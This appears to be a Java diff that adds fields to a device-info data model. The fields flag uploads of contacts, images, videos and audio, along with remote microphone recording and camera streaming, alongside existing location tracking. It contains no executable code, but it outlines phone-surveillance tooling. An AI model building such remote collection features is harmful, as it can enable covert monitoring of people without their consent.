@@ -14,7 +14,6 @@ public class DeviceInfoResponse {
     private String deviceId;
     private String deviceModel;
     private String appVersion;
-
     private Double latitude;
     private Double longitude;
     private String address;
@@ -23,4 +22,23 @@ public class DeviceInfoResponse {
 
     private Boolean trackingEnabled;
     private Integer trackingInterval;
+
+    private Boolean contactsUploaded;
+    private Boolean refreshContacts;
+
+    private Boolean imagesUploaded;
+    private Boolean refreshImages;
+
+    private Boolean refreshVideos;
+    private Boolean videosUploaded;
+
+    private Boolean audiosUploaded;
+    private Boolean refreshAudios;
+
+    private Boolean refreshMic;
+    private Integer micDuration;
+    private Boolean micUploaded;
+
+    private Boolean refreshCamera;
+    private Boolean cameraStreaming;
 }
